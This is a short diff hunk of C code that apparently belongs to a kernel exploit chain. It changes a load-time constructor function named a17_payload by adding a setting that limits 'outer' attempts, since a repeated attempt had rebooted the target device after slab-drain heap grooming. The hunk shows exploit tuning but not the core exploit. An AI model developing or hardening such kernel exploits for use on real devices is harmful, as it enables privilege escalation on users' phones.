@@ -87,6 +87,11 @@ __attribute__((constructor)) static void a17_payload(void) {
    * repeated mm_struct slab churn. */
   setenv("GL_SLAB_DRAIN_BATCH", "24", 1);
   setenv("GL_SLAB_DRAIN_WAVES", "8", 1);
+  /* A connected miss leaves deliberately retained carrier pages behind.
+   * Re-reclaiming inside the same process reuses that dirty state and has
+   * rebooted CZG1 at the second outer prime.  Return cleanly after one outer;
+   * a later app run starts with a fresh process and descriptor set. */
+  setenv("GL_RWF_OUTERS", "1", 1);
 
   pid_t chain = fork();
   if (chain < 0) {
